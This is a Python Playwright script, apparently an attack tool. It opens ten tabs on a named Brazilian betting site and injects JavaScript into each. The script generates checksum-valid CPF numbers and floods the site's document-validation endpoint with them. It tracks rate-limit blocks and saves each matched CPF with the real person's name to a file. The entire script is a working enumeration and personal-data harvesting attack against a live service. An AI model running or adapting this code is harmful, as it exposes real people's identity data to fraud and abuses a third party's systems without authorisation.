#!/usr/bin/env python3
"""
Injetor Multi-Tab V2 - 10 tabs sequenciais
"""
import random
import time
from playwright.sync_api import sync_playwright

NUM_TABS = 10
REQUESTS_PER_TAB = 100
BATCH_SIZE = 20

def gerar_cpf():
    cpf = [random.randint(0, 9) for _ in range(9)]
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    return ''.join(map(str, cpf))

def main():
    total = NUM_TABS * REQUESTS_PER_TAB
    
    print("="*65)
    print(f"💉 INJETOR MULTI-TAB V2 - {NUM_TABS} TABS")
    print("="*65)
    print(f"   Requisições por tab: {REQUESTS_PER_TAB}")
    print(f"   Total: {total}")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        
        # Abre todas as tabs primeiro
        print(f"\n🌐 Abrindo {NUM_TABS} tabs...")
        pages = []
        for i in range(NUM_TABS):
            page = context.new_page()
            page.goto("https://7k.bet.br/", wait_until="domcontentloaded")
            pages.append(page)
            print(f"   Tab {i+1}/{NUM_TABS} aberta")
        
        print(f"\n⏳ Aguardando carregamento...")
        time.sleep(3)
        
        # Injeta código em todas as tabs
        print(f"\n💉 Injetando código em {NUM_TABS} tabs...")
        for i, page in enumerate(pages):
            page.evaluate("""() => {
                window.stats = {ok: 0, validos: [], blocked: 0, erro: 0};
                window.validarCPF = async (cpf) => {
                    try {
                        const r = await fetch('/api/documents/validate', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({number: cpf, type: 'cpf'})
                        });
                        if (r.status === 200) {
                            const data = await r.json();
                            window.stats.ok++;
                            window.stats.validos.push({cpf, nome: data.data?.name || 'N/A'});
                        } else if (r.status === 400) {
                            window.stats.ok++;
                        } else if (r.status === 403) {
                            window.stats.blocked++;
                        } else {
                            window.stats.erro++;
                        }
                    } catch (e) {
                        window.stats.erro++;
                    }
                };
                window.validarLote = async (cpfs) => {
                    await Promise.all(cpfs.map(cpf => window.validarCPF(cpf)));
                    return window.stats;
                };
            }""")
        
        print(f"\n🚀 Iniciando requisições...")
        
        inicio = time.time()
        batches = REQUESTS_PER_TAB // BATCH_SIZE
        total_ok = 0
        all_validos = []
        total_blocked = 0
        
        for batch in range(batches):
            # Prepara CPFs para cada tab
            all_cpfs = [[gerar_cpf() for _ in range(BATCH_SIZE)] for _ in range(NUM_TABS)]
            
            # Dispara em todas as tabs (não é paralelo de verdade, mas rápido)
            for i, page in enumerate(pages):
                page.evaluate("cpfs => window.validarLote(cpfs)", all_cpfs[i])
            
            # Coleta resultados
            for i, page in enumerate(pages):
                try:
                    stats = page.evaluate("() => window.stats")
                    total_ok += stats["ok"]
                    total_blocked += stats["blocked"]
                    for v in stats["validos"]:
                        if v not in all_validos:
                            all_validos.append(v)
                    # Reset para próximo batch
                    page.evaluate("() => { window.stats = {ok: 0, validos: [], blocked: 0, erro: 0}; }")
                except:
                    pass
            
            elapsed = time.time() - inicio
            done = (batch + 1) * BATCH_SIZE * NUM_TABS
            rate = done / elapsed if elapsed > 0 else 0
            
            print(f"[{batch+1:2d}/{batches}] Done: {done:4d} | OK: {total_ok:4d} | 🎯 {len(all_validos):3d} válidos | 🚫 {total_blocked:3d} | {rate:.1f} req/s")
        
        tempo = time.time() - inicio
        
        print("\n" + "="*65)
        print("📊 RELATÓRIO FINAL")
        print("="*65)
        print(f"   Tabs: {NUM_TABS}")
        print(f"   Total requisições: {total}")
        print(f"   Tempo: {tempo:.1f}s")
        print(f"\n   ⚡ VELOCIDADE: {total/tempo:.1f} req/s")
        print(f"\n   ✅ OK: {total_ok}")
        print(f"   🎯 Válidos: {len(all_validos)}")
        print(f"   🚫 Blocked: {total_blocked}")
        
        if all_validos:
            print(f"\n🎯 CPFs VÁLIDOS ({len(all_validos)}):")
            for v in all_validos[:50]:
                cpf = v['cpf']
                print(f"   {cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}")
            
            with open("cpfs_10tabs.txt", "w", encoding="utf-8") as f:
                for v in all_validos:
                    cpf = v['cpf']
                    f.write(f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}\n")
            print(f"\n💾 Salvos em cpfs_10tabs.txt")
        
        browser.close()
        
        print("\n" + "="*65)
        print(f"✅ CONCLUSÃO: {total/tempo:.1f} req/s com {NUM_TABS} tabs")
        print("="*65)

if __name__ == "__main__":
    main()







